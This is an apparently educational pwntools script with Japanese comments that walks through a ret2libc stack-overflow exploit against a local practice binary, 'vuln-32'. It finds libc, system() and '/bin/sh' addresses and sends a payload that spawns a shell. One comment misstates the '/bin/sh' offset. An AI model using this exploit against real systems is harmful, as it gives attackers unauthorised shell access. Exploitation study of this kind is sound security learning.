# SOFの脆弱性があり、カナリアがなくてPIE・ASLRがオフならできる
# libcのアドレスを見つけ出し、それにsystem()関数と/bin/sh文字列のオフセットをそれぞれ足し合わせれば
# それぞれのアドレスになるため、これを利用してSOFでメモリにsystemへのアドレスと/bin/shへのポインタを配置し、正規のretでsystem()を実行させる。
# これによってsystem()が/bin/shを実行する

# libcは0xf7d68000にあるとわかる
# ldd vuln-32
# linux-gate.so.1 (0xf7fc6000)
# libc.so.6 => /usr/lib32/libc.so.6 (0xf7d68000)
# /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7fc8000)


# libc内でsysytemがどこにあるかを調べるとオフセット50560にあると分かる
# readelf -s /usr/lib32/libc.so.6 | grep system
#      1149: 00050560    63 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0


# /bin/shの文字列を探す。オフセット1cce3にある
# strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh
# 1cce3c /bin/sh

from pwn import *
import sys

p = process('./vuln-32')

libc_base = 0xf7d68000
system = libc_base + 0x50560
bin_sh = libc_base + 0x1cce3c

payload = b'A' * 76
payload += p32(system)	    # リターンアドレスをsystem()にする
payload += p32(0x0)	        # systemが戻る先のアドレス
payload += p32(bin_sh)	    # 引数の/bin/shのポインタ

# sys.stdout.buffer.write(payload)

p.clean()
p.sendline(payload)
p.interactive()
